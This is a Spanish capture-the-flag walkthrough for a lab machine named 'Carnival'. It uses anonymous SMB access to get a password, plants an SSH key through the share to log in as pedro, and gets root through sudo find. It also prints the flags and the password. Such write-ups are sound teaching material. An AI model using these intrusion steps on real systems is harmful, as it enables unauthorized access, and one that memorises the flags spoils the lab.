# Manual de Resolución - Máquina "Carnival"

---

# 🧬 1. **Reconocimiento**

### 🔍 Escaneo de puertos:
```bash
sudo nmap 10.10.56.58 -n -Pn -sC -sV -sS --min-rate 5000 -oN scan1.txt
```

### 🌟 Resultados principales:
| Puerto | Servicio | Versión                       |
|:------:|:--------:|:-----------------------------:|
| 22/tcp | SSH      | OpenSSH 7.9p1 Debian 10         |
| 139/tcp | Samba   | Samba 3.X - 4.X (WORKGROUP)     |
| 445/tcp | Samba   | Samba 4.9.5-Debian              |

---

# 🧬 2. **Enumeración**

### 🔎 Enumeración de recursos SMB:
```bash
smbclient -L \\10.10.56.58\\ -N
```

👌 Shares encontrados:
- `private`
- `pedro`
- `IPC$` (por defecto)

### 📂 Acceso a share `private`:
```bash
smbclient \\\\10.10.56.58\\private -N
```

Archivo encontrado:
- `creds.bak`

Descargado con:
```bash
get creds.bak
```

Contenido:
```
n0m30olv1d0123!
```

---

# 🧬 3. **Explotación inicial**

### 🚪 Acceso al share `pedro`:
```bash
smbclient \\\\10.10.56.58\\pedro -U pedro
```

Archivos encontrados:
- `.bash_logout`
- `.bashrc`
- `.profile`
- `user.txt` (**primer flag**)

Descarga masiva:
```bash
prompt OFF
mget *
```

Flag `user.txt`:
```
ab740cf8182f14d13f608e372a697bb1
```

---

# 🧬 4. **Movimiento lateral**

### 🔒 Intento de acceso SSH:
```bash
ssh pedro@10.10.56.58
```

Resultado: ❌ `Permission denied (publickey)`

---

# 🧬 5. **Estrategia alternativa (Key Injection)**

### 🔑 Creación de par de claves SSH:
```bash
ssh-keygen -t rsa -b 4096 -f carnival_pedro_key
```

Preparación de `authorized_keys`:
```bash
cp carnival_pedro_key.pub authorized_keys
```

Subida mediante `smbclient`:
```bash
smbclient \\\\10.10.56.58\\pedro -U pedro
put authorized_keys
```

---

# 🧬 6. **Acceso SSH exitoso**

Conexión usando clave privada:
```bash
ssh -i carnival_pedro_key pedro@10.10.56.58
```

Resultado: ✅ Shell como `pedro`.

---

# 🧬 7. **Escalada de privilegios**

### 🔍 Enumeración de permisos sudo:
```bash
sudo -l
```

Resultado:
```
(ALL) NOPASSWD: /usr/bin/find
```

### 🚀 Escalada utilizando `find`:
```bash
sudo /usr/bin/find . -exec /bin/bash \;
```

Verificación:
```bash
whoami
# Resultado: root
```

---

# 🧬 8. **Captura de bandera de root**

### 📂 Navegación hacia `/root/`:
```bash
cd /root
ls
cat root.txt
```

Flag `root.txt`:
```
25b5d447d35f3323f711a741cc80c2e2
```

---

# 🌿 Resumen general

| Fase                         | Resultado alcanzado             |
|:-----------------------------:|:-------------------------------:|
| **Reconocimiento**            | Descubrimiento de servicios.    |
| **Enumeración**               | Acceso anónimo en SMB.           |
| **Explotación inicial**       | Credenciales extraídas.          |
| **Movimiento lateral**        | Inyección de clave SSH.          |
| **Acceso usuario**            | Shell como `pedro`.              |
| **Escalada de privilegios**   | Root mediante abuso de `find`.   |
| **Captura de flags**          | `user.txt` y `root.txt` capturadas. |

---

# 🔢 Conclusión

Esta máquina demostró la importancia de:
- Configuración segura de shares de Samba.
- Protección de credenciales sensibles.
- Restricción adecuada de comandos `sudo`.
- Correcta gestión de llaves SSH.

